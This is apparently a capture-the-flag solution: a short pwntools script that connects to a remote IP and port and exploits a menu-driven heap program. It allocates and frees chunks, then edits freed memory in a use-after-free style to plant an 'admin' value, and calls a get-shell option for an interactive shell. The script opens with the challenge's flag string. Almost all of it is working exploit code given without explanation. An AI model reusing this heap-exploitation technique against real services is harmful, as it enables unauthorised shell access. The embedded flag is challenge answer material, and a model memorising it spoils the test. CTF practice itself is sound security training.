#FwordCTF{th1s_will_b3_your_f1rSt_st3p_481364972164}
from pwn import *

target = remote('40.71.72.198', 1234)

def sa(d):
	target.sendafter(">>", d)

def sla(d):
	sa( d+"\n")

def malloc(sz, content="noob"):
	sla("1")
	sla(str(sz))
	if sz < 0x80:
		sa(content)

def free():
	sla("2")

def edit(content):
	sla("3")
	sa(content)

def get_shell():
	sla("4")

malloc(0x78, "A"*8)
free()
malloc(0x10, "B"*8)
free()
edit("admin\x00" + "dumbn00b")
malloc(0x20)

get_shell()

target.interactive()